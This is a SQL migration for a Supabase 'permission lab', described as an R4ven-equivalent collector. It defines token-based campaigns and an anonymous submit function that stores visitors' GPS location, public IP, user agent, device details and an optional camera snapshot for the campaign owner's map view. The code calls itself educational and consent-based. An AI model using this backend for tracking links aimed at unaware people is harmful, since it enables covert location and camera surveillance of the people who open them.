-- Permission / developer consent lab (R4ven-equivalent collectors).
-- Events stay inside GeoPhone (Supabase). No Discord / Telegram / external webhooks.

create table if not exists public.permission_lab_campaigns (
  id uuid primary key default gen_random_uuid(),
  owner_id uuid not null references auth.users (id) on delete cascade,
  token text not null unique,
  label text not null default 'Permission lab',
  created_at timestamptz not null default now(),
  expires_at timestamptz not null default (now() + interval '7 days'),
  ended_at timestamptz,
  constraint permission_lab_campaigns_token_len check (char_length(token) between 8 and 80)
);

create table if not exists public.permission_lab_events (
  id uuid primary key default gen_random_uuid(),
  campaign_id uuid not null references public.permission_lab_campaigns (id) on delete cascade,
  created_at timestamptz not null default now(),
  read_at timestamptz,
  -- Denormalized for fast admin filters / map pins
  lat double precision,
  lng double precision,
  accuracy double precision,
  client_ip text,
  user_agent text,
  -- Full educational payload (device, permissions, optional snapshot metadata)
  payload jsonb not null default '{}'::jsonb
);

create index if not exists permission_lab_campaigns_owner_idx
  on public.permission_lab_campaigns (owner_id, created_at desc);
create index if not exists permission_lab_events_campaign_idx
  on public.permission_lab_events (campaign_id, created_at desc);
create index if not exists permission_lab_events_unread_idx
  on public.permission_lab_events (campaign_id)
  where read_at is null;

alter table public.permission_lab_campaigns enable row level security;
alter table public.permission_lab_events enable row level security;

drop policy if exists "Owners manage permission lab campaigns" on public.permission_lab_campaigns;
create policy "Owners manage permission lab campaigns"
  on public.permission_lab_campaigns for all to authenticated
  using (auth.uid() = owner_id or public.is_admin())
  with check (auth.uid() = owner_id or public.is_admin());

drop policy if exists "Owners and admins read permission lab events" on public.permission_lab_events;
create policy "Owners and admins read permission lab events"
  on public.permission_lab_events for select to authenticated
  using (
    public.is_admin()
    or exists (
      select 1 from public.permission_lab_campaigns c
      where c.id = campaign_id and c.owner_id = auth.uid()
    )
  );

drop policy if exists "Owners and admins update permission lab events" on public.permission_lab_events;
create policy "Owners and admins update permission lab events"
  on public.permission_lab_events for update to authenticated
  using (
    public.is_admin()
    or exists (
      select 1 from public.permission_lab_campaigns c
      where c.id = campaign_id and c.owner_id = auth.uid()
    )
  )
  with check (
    public.is_admin()
    or exists (
      select 1 from public.permission_lab_campaigns c
      where c.id = campaign_id and c.owner_id = auth.uid()
    )
  );

-- No direct anon insert; use SECURITY DEFINER RPCs with campaign token.

create or replace function public.permission_lab_info(p_token text)
returns jsonb
language plpgsql
security definer
set search_path = public
as $$
declare
  c public.permission_lab_campaigns;
begin
  if p_token is null or char_length(p_token) < 8 then
    return jsonb_build_object('state', 'invalid');
  end if;

  select * into c from public.permission_lab_campaigns where token = p_token;
  if not found then
    return jsonb_build_object('state', 'invalid');
  end if;
  if c.ended_at is not null then
    return jsonb_build_object('state', 'ended', 'label', c.label);
  end if;
  if c.expires_at <= now() then
    return jsonb_build_object('state', 'expired', 'label', c.label);
  end if;

  return jsonb_build_object(
    'state', 'active',
    'label', c.label,
    'expires_at', c.expires_at
  );
end;
$$;

create or replace function public.permission_lab_submit(p_token text, p_payload jsonb)
returns jsonb
language plpgsql
security definer
set search_path = public
as $$
declare
  c public.permission_lab_campaigns;
  cleaned jsonb;
  snap text;
  new_id uuid;
  v_lat double precision;
  v_lng double precision;
  v_acc double precision;
  v_ip text;
  v_ua text;
begin
  if p_token is null or char_length(p_token) < 8 then
    return jsonb_build_object('ok', false, 'error', 'invalid_token');
  end if;
  if p_payload is null or jsonb_typeof(p_payload) <> 'object' then
    return jsonb_build_object('ok', false, 'error', 'invalid_payload');
  end if;

  select * into c from public.permission_lab_campaigns where token = p_token;
  if not found then
    return jsonb_build_object('ok', false, 'error', 'invalid_token');
  end if;
  if c.ended_at is not null or c.expires_at <= now() then
    return jsonb_build_object('ok', false, 'error', 'inactive');
  end if;

  cleaned := p_payload - 'discord' - 'webhook' - 'webhook_url';

  -- Cap optional camera snapshot (educational single frame only).
  snap := cleaned ->> 'camera_snapshot_jpeg_base64';
  if snap is not null and char_length(snap) > 180000 then
    cleaned := cleaned - 'camera_snapshot_jpeg_base64';
    cleaned := cleaned || jsonb_build_object('camera_snapshot_truncated', true);
  end if;

  begin
    v_lat := nullif(cleaned #>> '{gps,latitude}', '')::double precision;
    v_lng := nullif(cleaned #>> '{gps,longitude}', '')::double precision;
    v_acc := nullif(cleaned #>> '{gps,accuracy}', '')::double precision;
  exception when others then
    v_lat := null;
    v_lng := null;
    v_acc := null;
  end;

  v_ip := left(coalesce(cleaned ->> 'public_ip', cleaned #>> '{ip,query}', ''), 64);
  v_ua := left(coalesce(cleaned #>> '{device,userAgent}', ''), 512);

  insert into public.permission_lab_events (
    campaign_id, lat, lng, accuracy, client_ip, user_agent, payload
  ) values (
    c.id, v_lat, v_lng, v_acc, nullif(v_ip, ''), nullif(v_ua, ''), cleaned
  )
  returning id into new_id;

  return jsonb_build_object('ok', true, 'id', new_id);
end;
$$;

grant execute on function public.permission_lab_info(text) to anon, authenticated;
grant execute on function public.permission_lab_submit(text, jsonb) to anon, authenticated;

grant select, insert, update, delete on public.permission_lab_campaigns to authenticated;
grant select, update on public.permission_lab_events to authenticated;

comment on table public.permission_lab_campaigns is
  'Consent / developer permission-lab campaigns. Captures go to GeoPhone inbox only — never Discord.';
comment on table public.permission_lab_events is
  'Inbox rows for permission-lab probes (IP, UA, GPU, screen, geo/camera/mic permission results).';
